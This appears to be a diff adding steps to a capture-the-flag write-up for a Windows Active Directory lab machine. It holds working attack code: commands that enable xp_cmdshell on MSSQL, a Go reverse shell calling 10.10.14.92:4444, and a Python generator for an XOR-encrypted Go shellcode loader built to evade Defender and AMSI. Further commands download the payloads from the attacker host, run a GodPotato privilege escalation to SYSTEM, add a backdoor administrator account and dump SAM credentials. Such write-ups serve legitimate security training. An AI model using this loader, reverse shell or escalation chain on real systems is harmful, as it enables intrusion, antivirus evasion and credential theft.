@@ -1646,12 +1646,203 @@ nxc mssql 172.16.0.11 -u svc-mssql -p 'cml958782' -d odyssey.htb -x 'whoami /pri
 ```bash
 impacket-mssqlclient 'ODYSSEY/svc-mssql:cml958782@172.16.0.11' -p 1433 -windows-auth
 EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
-EXEC xp_cmdshell 'net use Z: \\10.10.14.92\share /user:user pass';
 
 # On kali
 impacket-smbserver share $(pwd) -smb2support -user user -password pass
 
+EXEC xp_cmdshell 'net use Z: \\10.10.14.92\share /user:user pass';
+
 EXEC xp_cmdshell 'copy \\10.10.14.92\share\GodPotato-NET4.exe C:\Users\svc-mssql\Desktop\gp.exe';
 # Operation did not complete successfully because the file contains a virus or potentially unwanted software.
+```
+{% endcode %}
+
+**So we need to use a red team technic to avoid the defender**&#x20;
+
+**We write a go rev shell, we use go to bypass AMSI, no .NET no powershell**&#x20;
+
+{% code overflow="wrap" %}
+```go
+cd /home/gb05/Desktop/CPTS_PREP/loader
+cat > gorevshell.go << 'EOF'
+package main
+
+import (
+	"bufio"
+	"net"
+	"os/exec"
+	"strings"
+)
+
+func main() {
+    // Remplace par ton IP et le port de ton listener
+	conn, err := net.Dial("tcp", "10.10.14.92:4444")
+	if err != nil {
+		return
+	}
+	defer conn.Close()
+
+	scanner := bufio.NewScanner(conn)
+	for scanner.Scan() {
+		cmd := exec.Command("cmd.exe", "/c", strings.TrimSpace(scanner.Text()))
+		out, _ := cmd.CombinedOutput()
+		conn.Write(out)
+		conn.Write([]byte("SYSTEM> "))
+	}
+}
+EOF
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```bash
+GOOS=windows GOARCH=amd64 go build -o s.exe -ldflags "-s -w" gorevshell.go
+```
+{% endcode %}
+
+**Then we generate the shellcode of God-Potato with Donut**&#x20;
+
+{% code overflow="wrap" %}
+```bash
+/opt/donut/donut -a 2 -i /home/gb05/Desktop/CPTS_PREP/ADtools/GodPotato-NET4.exe -p "-cmd C:\Users\svc-mssql\Desktop\s.exe" -o gp.bin
+```
+{% endcode %}
+
+**Then we will generate the loader that will read the shellcode and encrypt it using XOR with random key**&#x20;
+
+{% code overflow="wrap" %}
+```bash
+cat > loader.py << 'EOF'
+import secrets
+
+def to_go_bytes(data, name):
+    lines = [f"var {name} = []byte{{"]
+    for i in range(0, len(data), 16):
+        chunk = data[i:i+16]
+        lines.append("\t" + ", ".join(f"0x{b:02x}" for b in chunk) + ",")
+    lines.append("}")
+    return "\n".join(lines)
+
+# 1. Lire le shellcode brut de Donut
+with open("gp.bin", "rb") as f:
+    shellcode = f.read()
+
+print(f"[*] Loaded {len(shellcode)} bytes of shellcode from gp.bin")
+
+# 2. Chiffrement XOR avec clé aléatoire
+key = secrets.token_bytes(32)
+encrypted = bytes([shellcode[i] ^ key[i % len(key)] for i in range(len(shellcode))])
+
+# 3. Générer le code Go du loader
+go_code = f'''package main
+
+import (
+	"syscall"
+	"unsafe"
+)
+
+{to_go_bytes(key, "key")}
+
+{to_go_bytes(encrypted, "enc")}
+
+func main() {{
+	// Décryptage en mémoire
+	sc := make([]byte, len(enc))
+	for i := range enc {{
+		sc[i] = enc[i] ^ key[i%len(key)]
+	}}
+
+	kernel32 := syscall.NewLazyDLL("kernel32.dll")
+	vAlloc := kernel32.NewProc("VirtualAlloc")
+	
+	// Allocation en PAGE_READWRITE (0x04) - PAS de RWX !
+	addr, _, _ := vAlloc.Call(0, uintptr(len(sc)), 0x3000, 0x04)
+	
+	// Copie manuelle byte-par-byte (évite les hooks sur RtlCopyMemory/memcpy)
+	for i, b := range sc {{
+		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
+	}}
+
+	// Flip vers PAGE_EXECUTE_READ (0x20) - La page n'est jamais W+X en même temps
+	var old uint32
+	vProt := kernel32.NewProc("VirtualProtect")
+	vProt.Call(addr, uintptr(len(sc)), 0x20, uintptr(unsafe.Pointer(&old)))
+
+	// Exécution via CreateThread
+	createThread := kernel32.NewProc("CreateThread")
+	waitForSingleObject := kernel32.NewProc("WaitForSingleObject")
+	
+	thread, _, _ := createThread.Call(0, 0, addr, 0, 0, 0)
+	waitForSingleObject.Call(thread, 0xFFFFFFFF)
+}}
+'''
+
+with open("loader.go", "w") as f:
+    f.write(go_code)
+
+print(f"[+] Generated loader.go successfully!")
+EOF
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```bash
+python3 loader.py
+```
+{% endcode %}
+
+**then we compile the loader**
+
+{% code overflow="wrap" %}
+```bash
+GOOS=windows GOARCH=amd64 go build -o p.exe -ldflags "-s -w" loader.go
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```bash
+# on kali in 2 terminal
+serv 8080
+listener 4444
+
+# on the mssql
+EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://10.10.14.92:8080/s.exe -OutFile C:\Users\svc-mssql\Desktop\s.exe"';
+
+EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://10.10.14.92:8080/p.exe -OutFile C:\Users\svc-mssql\Desktop\p.exe"';
+
+EXEC xp_cmdshell 'dir C:\Users\svc-mssql\Desktop\*.exe';
+07/05/2026  01:28 PM         1,172,992 p.exe
+07/05/2026  01:28 PM         2,172,928 s.exe
+
+EXEC xp_cmdshell 'C:\Users\svc-mssql\Desktop\p.exe';
+
+# on the listenr
+connect to [10.10.14.92] from (UNKNOWN) [10.129.48.255] 49309
+
+SYSTEM> whoami
+nt authority\system
+```
+{% endcode %}
+
+<mark style="color:blue;">**Step 11**</mark>&#x20;
+
+**Now we need to pivot to DC01**
+
+{% code overflow="wrap" %}
+```powershell
+net user hacker Password123! /add
+net localgroup Administrators hacker /add
+powershell -c "net localgroup 'Remote Management Users' hacker /add"
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```bash
+evil-winrm -i 172.16.0.11 -u hacker -p 'Password123!'
+
+reg save HKLM\SAM C:\Windows\Temp\sam.hive /y
+reg save HKLM\SYSTEM C:\Windows\Temp\system.hive /y
+
+impacket-secretsdump LOCAL -system system.hive -sam sam.hive
 ```
 {% endcode %}
